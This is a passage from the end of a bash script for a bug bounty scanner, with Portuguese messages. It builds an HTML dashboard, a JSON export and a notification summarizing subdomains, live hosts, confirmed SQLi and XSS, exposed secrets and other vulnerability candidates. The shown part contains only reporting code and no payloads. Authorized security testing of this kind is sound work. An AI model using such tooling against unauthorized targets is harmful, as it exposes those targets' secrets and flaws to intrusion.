    .active{background:#dcfce7;color:#166534;border:2px solid #10b981}
    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;margin:20px 0}
    .card{background:white;padding:20px;border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,0.1);border-left:4px solid #6366f1}
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>🎯 Enhanced Bug Bounty Dashboard</h1>
      <p><strong>Generated:</strong> $(date -u) | <strong>Target:</strong> $(basename "$SCOPE_FILE")</p>
      <span class="profile-badge">Profile: $PROFILE</span>
    </div>
    
    <div class="status $([ "$DRY_RUN" = "true" ] && echo "dry-run" || echo "active")">
      Mode: $([ "$DRY_RUN" = "true" ] && echo "🔍 DRY-RUN (Collection Only)" || echo "⚡ ACTIVE SCANNING")
    </div>
    
    <h2>📊 Attack Surface Overview</h2>
    <div class="metric">
      <div class="metric-value">$SUBS_FOUND</div>
      <div class="metric-label">Subdomains</div>
    </div>
    <div class="metric success">
      <div class="metric-value">$LIVE_HOSTS</div>
      <div class="metric-label">Live Hosts</div>
    </div>
    <div class="metric">
      <div class="metric-value">$TOTAL_URLS</div>
      <div class="metric-label">URLs Found</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$PARAM_URLS</div>
      <div class="metric-label">With Parameters</div>
    </div>
    <div class="metric">
      <div class="metric-value">$API_ENDPOINTS</div>
      <div class="metric-label">API Endpoints</div>
    </div>
    
    <h2>🔥 Critical Security Findings</h2>
    <div class="metric critical">
      <div class="metric-value">$NUCLEI_FAST_TOTAL</div>
      <div class="metric-label">Nuclei Critical</div>
    </div>
    <div class="metric critical">
      <div class="metric-value">$SQLI_VALIDATED</div>
      <div class="metric-label">SQLi Confirmed</div>
    </div>
    <div class="metric critical">
      <div class="metric-value">$DALFOX_RESULTS</div>
      <div class="metric-label">XSS Confirmed</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$TOTAL_SECRETS</div>
      <div class="metric-label">Secrets Exposed</div>
    </div>
    
    <h2>⚡ Vulnerability Candidates</h2>
    <div class="metric warning">
      <div class="metric-value">$XSS_CANDIDATES</div>
      <div class="metric-label">XSS Candidates</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$SQLI_CANDIDATES</div>
      <div class="metric-label">SQLi Candidates</div>
    </div>
    <div class="metric">
      <div class="metric-value">$LFI_CANDIDATES</div>
      <div class="metric-label">LFI Candidates</div>
    </div>
    <div class="metric">
      <div class="metric-value">$SSRF_CANDIDATES</div>
      <div class="metric-label">SSRF Candidates</div>
    </div>
    
    <div class="grid">
      <div class="card">
        <h3>🔧 Profile Configuration</h3>
        <ul>
          <li>Concurrency: $CONCURRENCY threads</li>
          <li>Rate Limit: $RATE_LIMIT/s</li>
          <li>Parallel Hosts: $PARALLEL_HOSTS</li>
          <li>Timeout: $TIMEOUT_PER_HOST</li>
          <li>CPUs: $NCPU</li>
        </ul>
      </div>
      
      <div class="card">
        <h3>📈 Success Rates</h3>
        <ul>
          <li>Subdomain Expansion: $(echo "scale=1; $SUBS_FOUND / $TOTAL_DOMAINS" | bc 2>/dev/null || echo "N/A")x</li>
          <li>Live Host Rate: $(echo "scale=1; $LIVE_HOSTS * 100 / $SUBS_FOUND" | bc 2>/dev/null || echo "N/A")%</li>
          <li>Parameterized URLs: $(echo "scale=1; $PARAM_URLS * 100 / $TOTAL_URLS" | bc 2>/dev/null || echo "N/A")%</li>
        </ul>
      </div>
    </div>
    
    <h2>🔍 Latest Critical Findings</h2>
    <pre>$(head -n 20 nuclei/nuclei_*_fast.txt nuclei/dalfox_results.txt 2>/dev/null || echo "No critical findings in this scan")</pre>
    
    <h2>🔗 Quick Navigation</h2>
    <div class="grid">
      <div class="card">
        <h3>📋 Reports</h3>
        <ul>
          <li><a href="../reports/report.md">📋 Full Report</a></li>
          <li><a href="../reports/vuln_summary.txt">⚡ Quick Summary</a></li>
        </ul>
      </div>
      
      <div class="card">
        <h3>🔥 Vulnerabilities</h3>
        <ul>
          <li><a href="../nuclei/">🎯 Nuclei Results</a></li>
          <li><a href="../secrets/">🔑 Secrets Directory</a></li>
          <li><a href="../urls/sqli_validated.txt">💉 SQLi Confirmed</a></li>
          <li><a href="../urls/gf_xss.txt">❌ XSS Candidates</a></li>
          <li><a href="../urls/gf_sqli.txt">💉 SQLi Candidates</a></li>
          <li><a href="../poc/sqli/">📁 SQLi PoCs</a></li>
        </ul>
      </div>
      
      <div class="card">
        <h3>📊 Data Files</h3>
        <ul>
          <li><a href="../alive/hosts.txt">✅ Live Hosts</a></li>
          <li><a href="../urls/with_params.txt">🎯 Parameterized URLs</a></li>
          <li><a href="../apis/api_endpoints.txt">🔌 API Endpoints</a></li>
          <li><a href="../js/downloads/">📜 JS Files</a></li>
        </ul>
      </div>
    </div>
    
    <div style="text-align:center;margin-top:40px;padding:20px;background:#f8f9fa;border-radius:10px">
      <p><strong>Enhanced Bug Bounty Scanner v2.0</strong></p>
      <p>Profile-based • Safety-first • Comprehensive coverage</p>
    </div>
  </div>
</body>
</html>
HTMLDOC

# ============= EXPORT JSON (OPCIONAL) =============
if [[ "$EXPORT_JSON" = "true" ]]; then
    log_info "Exportando resultados em JSON..."
    
    cat > reports/results.json <<-JSONEOF
{
  "scan_info": {
    "timestamp": "$(date -u -Iseconds)",
    "target_scope": "$(basename "$SCOPE_FILE")",
    "profile": "$PROFILE", 
    "mode": "$([ "$DRY_RUN" = "true" ] && echo "dry-run" || echo "active")",
    "configuration": {
      "concurrency": $CONCURRENCY,
      "rate_limit": $RATE_LIMIT,
      "parallel_hosts": $PARALLEL_HOSTS,
      "timeout_per_host": "$TIMEOUT_PER_HOST"
    }
  },
  "statistics": {
    "total_domains": $TOTAL_DOMAINS,
    "subdomains_found": $SUBS_FOUND,
    "live_hosts": $LIVE_HOSTS,
    "total_urls": $TOTAL_URLS,
    "parameterized_urls": $PARAM_URLS,
    "js_files": $JS_FILES,
    "api_endpoints": $API_ENDPOINTS,
    "ports_found": $PORTS_FOUND
  },
  "vulnerabilities": {
    "nuclei_critical": $NUCLEI_FAST_TOTAL,
    "nuclei_medium": $NUCLEI_EXT_TOTAL,
    "xss_confirmed": $DALFOX_RESULTS,
    "sqli_confirmed": $SQLI_VALIDATED,
    "secrets_exposed": $TOTAL_SECRETS,
    "candidates": {
      "xss": $XSS_CANDIDATES,
      "sqli": $SQLI_CANDIDATES,
      "lfi": $LFI_CANDIDATES,
      "ssrf": $SSRF_CANDIDATES
    }
  },
  "extra_tools": {
    "xss_detection": {
      "kxss_results": $KXSS_RESULTS
    },
    "endpoint_discovery": {
      "linkfinder_endpoints": $LINKFINDER_ENDPOINTS,
      "paramspider_params": $PARAMSPIDER_PARAMS
    },
    "secret_scanning": {
      "secretfinder_secrets": $SECRETFINDER_SECRETS
    },
    "visual_recon": {
      "gowitness_screenshots": $GOWITNESS_SCREENSHOTS,
      "aquatone_screenshots": $AQUATONE_SCREENSHOTS
    },
    "cloud_assets": {
      "s3_buckets_found": $S3_BUCKETS
    },
    "burp_suite": {
      "vulnerabilities_found": $BURP_VULNS
    }
  },
  "files": {
    "live_hosts": "alive/hosts.txt",
    "parameterized_urls": "urls/with_params.txt",
    "nuclei_results": "nuclei/",
    "secrets": "secrets/",
    "reports": "reports/"
  }
}
JSONEOF
fi

# ============= RELATÓRIO FINAL COM NOTIFICAÇÕES =============
final_report() {
    log_info "Enviando relatório final..."
    
    # Determinar nível de alerta
    if [[ "$NUCLEI_FAST_TOTAL" -gt 5 ]] || [[ "$DALFOX_RESULTS" -gt 0 ]] || [[ "$SQLI_VALIDATED" -gt 0 ]] || [[ "$TOTAL_SECRETS" -gt 10 ]]; then
        ALERT="🔴 *HIGH RISK*"
    elif [[ "$NUCLEI_FAST_TOTAL" -gt 0 ]] || [[ "$TOTAL_SECRETS" -gt 0 ]]; then
        ALERT="🟡 *MEDIUM RISK*"  
    else
        ALERT="🟢 *LOW RISK*"
    fi
    
    FINAL_SUMMARY="$ALERT  
🎯 *Enhanced Bug Bounty Scan COMPLETE* ✅
📂 \`$(pwd | sed 's/.*\///')\`  
⏱️ Finalizado: \`$(date '+%H:%M:%S')\`
🔧 Perfil: \`$PROFILE\` | Modo: \`$([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ATIVO")\`

*📊 Attack Surface:*  
- 🌐 Subdomains: $SUBS_FOUND  
- 🟢 Live hosts: $LIVE_HOSTS  
- 🔗 URLs: $TOTAL_URLS ($PARAM_URLS com parâmetros)  
- 🚪 Portas: $PORTS_FOUND abertas
- 🔌 APIs: $API_ENDPOINTS endpoints

*🔥 Critical Findings:*  
- ⚡ Nuclei crítico: $NUCLEI_FAST_TOTAL  
- 💉 SQLi confirmada: $SQLI_VALIDATED
- ❌ XSS confirmado: $DALFOX_RESULTS
- 🔑 Secrets expostos: $TOTAL_SECRETS

*⚡ Vulnerability Candidates:*  
- ❌ XSS candidatos: $XSS_CANDIDATES  
- 💉 SQLi candidatos: $SQLI_CANDIDATES
- 📁 LFI candidatos: $LFI_CANDIDATES
- 🌐 SSRF candidatos: $SSRF_CANDIDATES
- 🔍 Médio risco: $NUCLEI_EXT_TOTAL

*🎯 Next Steps:*
- Review critical Nuclei findings
- Validate XSS results from Dalfox  
- Check secrets/ directory for exposure
- Manual SQLi testing if authorized
$([ "$DRY_RUN" = "true" ] && echo "- Re-run with --confirm for active scanning" || echo "")
"
    
    send_notification "$FINAL_SUMMARY" "false"
}

final_report

# ============= SAÍDA FINAL COLORIDA =============
echo ""
echo "============================================================"
echo "🎯 ENHANCED BUG BOUNTY SCAN COMPLETE"
echo "============================================================"
echo "📁 Resultados salvos em: $(pwd)"
echo "🔧 Perfil usado: $PROFILE"
echo "⚙️  Modo: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (apenas coleta)" || echo "ATIVO (scanning completo)")"
echo ""
echo "📊 RESUMO EXECUTIVO:"
echo "   🌐 Subdomínios: $SUBS_FOUND"
echo "   ✅ Hosts vivos: $LIVE_HOSTS"
echo "   🔗 URLs coletadas: $TOTAL_URLS ($PARAM_URLS com parâmetros)"
echo "   🔌 APIs encontradas: $API_ENDPOINTS"
echo ""
echo "🔥 VULNERABILIDADES:"
echo "   ⚡ Nuclei crítico: $NUCLEI_FAST_TOTAL"
echo "   💉 SQLi confirmada: $SQLI_VALIDATED"
echo "   ❌ XSS confirmado: $DALFOX_RESULTS"
echo "   🔑 Secrets expostos: $TOTAL_SECRETS"
echo ""
echo "📋 RELATÓRIOS:"
echo "   📄 Relatório completo: reports/report.md"  
echo "   🌐 Dashboard HTML: html/dashboard.html"
echo "   📊 Resumo rápido: reports/vuln_summary.txt"
if [[ "$EXPORT_JSON" = "true" ]]; then
echo "   📋 Export JSON: reports/results.json"
fi
echo ""
echo "🚀 PRÓXIMOS PASSOS:"
echo "   1. Revisar findings críticos do Nuclei"
if [[ "$DALFOX_RESULTS" -gt 0 ]]; then
echo "   2. ⚠️  VALIDAR XSS confirmados pelo Dalfox"
fi
if [[ "$TOTAL_SECRETS" -gt 0 ]]; then
echo "   3. 🔍 VERIFICAR secrets expostos em secrets/"
fi
if [[ "$DRY_RUN" = "true" ]]; then
echo "   4. Re-executar com --confirm para scanning ativo"
fi
echo "   5. Teste manual de candidatos SQLi/LFI/SSRF"
echo ""
echo "⚠️  LEMBRETE: Validação manual necessária antes de reportar"
echo "============================================================"

# Log final
log_info "Scan completo. Profile: $PROFILE, Mode: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")"
log_info "Total runtime: $(date -d@$(($(date +%s) - $(stat -c %Y logs/scanner.log 2>/dev/null || date +%s))) -u +%H:%M:%S 2>/dev/null || echo "N/A")"

# Salvar configuração usada para referência futura
cat > logs/scan_config.txt <<-CONFIGEOF
SCAN CONFIGURATION - $(date -u)
==============================
Profile: $PROFILE
Mode: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")
Concurrency: $CONCURRENCY
Rate Limit: $RATE_LIMIT/s
Parallel Hosts: $PARALLEL_HOSTS
Timeout per Host: $TIMEOUT_PER_HOST
CPUs Used: $NCPU
Max Crawl Depth: $MAX_CRAWL_DEPTH

Command: $0 $*

Results Directory: $(pwd)
CONFIGEOF

exit 0